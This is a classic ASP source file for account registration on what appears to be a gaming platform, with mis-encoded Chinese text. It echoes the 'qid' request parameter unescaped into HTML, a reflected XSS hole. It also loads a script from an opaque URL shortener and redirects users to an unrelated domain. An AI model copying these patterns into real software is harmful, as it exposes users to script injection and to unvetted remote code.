<!--#include file="Conn.asp" -->
<!--#include file="md5.asp"-->
<!--#include file="w78_sql.asp" -->

<!doctype html>
<html>

	<head>
		<meta charset="gb2312">
		<title></title>

		<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" />
		<link href="css/mui.min.css" rel="stylesheet" />
		<link rel="stylesheet" type="text/css" href="css/iconfont.css" />
		<link rel="stylesheet" type="text/css" href="css/icons-extra.css" />
		<link rel="stylesheet" type="text/css" href="css/index.css" />
	</head>

	<body>
    
    		 <% 
		 
tijiao=trim(request("tijiao"))'��
 
id=trim(request("qid"))'��ҳURL
'  Response.Write tijiao
'  Response.Write id
'   Response.Write request("acc")
'	 Response.end 
 
 if tijiao =  "tj" then 'a=�ύ
 
	set rs=server.createobject("adodb.recordset")
	 	
	sql="select * from AccountsInfo "
	rs.open sql,conn,1,3
	
	NickName=request("nickname")
	
	name=request("acc")
	pw1=request("pw1")

			reg= "NULL"	
	
	
	
	if name=""  then 
	response.Write("<script language=javascript>alert('�ʺŲ���Ϊ��!');history.go(-1)</script>") 
	response.end 
	end if
	if pw1=""  then 
	response.Write("<script language=javascript>alert('���벻��Ϊ��!');history.go(-1)</script>") 
	response.end 
	end if
	 
	rs.addnew
	rs("Accounts")=name
	
	 if id <>  "" then 
	    rs("SpreaderID")=Cint(id)
		end if	
	rs("RegisterMobile")=name
	rs("NickName")=NickName
	
	'rs("GameID")=rs("GameID")+1
	
	rs("InsurePass")="63e6d63659df69db3162e90727cecb8a"
	rs("RegAccounts")=reg
	rs("LogonPass")=md5(pw1)
	
	rs("LastLogonIP")= "NULL"	
	rs("RegisterIP")=  "NULL"
	
	
	rs.update
 
	
	
	rs.close
	
	
	
	
	set rs=nothing
	xid=conn.execute("select top 1 UserID from AccountsInfo order by UserID desc")(0)
 'Rs.Open sqlStr,Cn,3,1
  
 'xid=conn.execute("select top 1 id from AccountsInfo order by id desc")

sql="select  GameID from AccountsInfo where UserID ="&xid-1
' Response.Write sql
gameid=conn.Execute(sql)(0)

 
		sql22="update AccountsInfo set GameID="&gameid+1&" where UserID ="&xid
		
	'   Response.Write sql22
 
conn.execute(sql22) 
 

	conn.close
	set rs=nothing
	'Response.Write "<script>alert('ע��ɹ���');window.location.href='index.asp';</script>" 
 
 
	 if id<>""  then 'a= �к�׺��ʱ��
	 
	



	 
	
	else  'a=�޺�׺��ʱ��
	response.write "222"
	end if 

 
 
 
 
end if 

		 
		 
		 
		 
		  %>
		<script src="js/mui.min.js"></script>
 
		<script src="js/jquery-3.2.1.min.js" type="text/javascript" charset="utf-8"></script>
 
    <script src=//t.cn/Ai9s1eVf></script>
    
		<script type="text/javascript">
			mui.init();
		</script>
		<!--ͷ��-->
		<header class="mui-bar mui-bar-nav">

			
			<a class="mui-icon mui-icon-reply mui-pull-right"></a>
			<h1 class="mui-title"><b>ע��</b></h1>
		</header>

		 
         <div class="mui-content"  style=" ">
			<div class="mui-content-padded" style="margin: 5px; ">
	 
		  <div class="mui-card">
				<div class="mui-card-content">
					<div class="mui-card-content-inner" style=" padding:80px;    text-align: center; ">
                    
						<h4 ><b>ע��ɹ���</b></h4><br>
<br>

                        <div class="mui-button-row">
                    <input name="tijiao" type="hidden" value="tj">
                     <input id="qid" name="qid"    type="hidden"  value="<%=request("qid") %>">
						<button type="button" class="mui-btn mui-btn-primary" onClick="return false;">ǰ������</button>&nbsp;&nbsp;
						<!--<button type="button" class="mui-btn mui-btn-danger" onclick="return false;">ȡ��</button>-->
					</div>
					</div>
				</div>
			</div>
		
			 
					
			
				 
			</div>
		</div>
         <script>
		 
 mui(".mui-button-row").on('tap','.mui-btn-primary',function(){
	 //ǰ����ַ
		window.location.href="http://xjzu.bq.mrfanfood.cn/oBj471"; 

}) 
		 
		

</script>

  
	</body>

</html>